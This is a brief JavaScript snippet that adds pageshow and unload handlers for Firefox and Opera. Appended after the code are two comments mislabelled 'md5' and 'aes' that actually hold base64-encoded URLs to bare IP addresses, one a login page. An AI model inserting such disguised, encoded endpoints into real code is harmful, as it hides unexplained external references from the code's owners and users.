if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzExOC4yNC4xMTAuNzI6ODAwOC8jL2xvZ2luL2xvZ2luP3Y9Mg==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/